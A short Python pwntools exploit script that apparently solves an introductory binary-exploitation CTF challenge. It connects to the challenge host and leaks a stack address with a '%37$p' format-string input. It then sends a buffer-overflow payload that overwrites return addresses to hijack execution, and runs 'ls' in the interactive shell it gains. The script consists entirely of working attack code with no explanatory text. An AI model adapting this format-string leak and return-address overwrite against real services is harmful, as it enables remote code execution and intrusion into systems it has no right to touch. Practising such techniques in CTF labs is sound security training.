import pwn

host = '41bbc0ab8db74132b06ab8fe-1024-intro-pwn-1.challenge.cscg.live'
port = 1337

# Create a remote connection
# Specify ssl=True for SSL connections
p  = pwn.remote(host, port, ssl=True)

input()
p.sendlineafter(b'Enter your witch name:\n',b'%37$p')
p.recvline()
p.recvline()
p.recvline()
res = int(p.recvuntil(b' ')[:-1],base = 16)
print(hex(res))
input()
exp = b"Expelliarmus"
ret = res + 0x1a4 + 0x3
payload = exp +b'\x00'+ (264-len(exp)-1) * b'A' +  pwn.p64(ret) + 0x10 * b"A"+ pwn.p64(res + 0x3)
if b'\x0a' in payload: 
    print(payload)
p.sendlineafter(b'enter your magic spell:',payload)
input()
p.sendline(b'ls')
p.interactive()
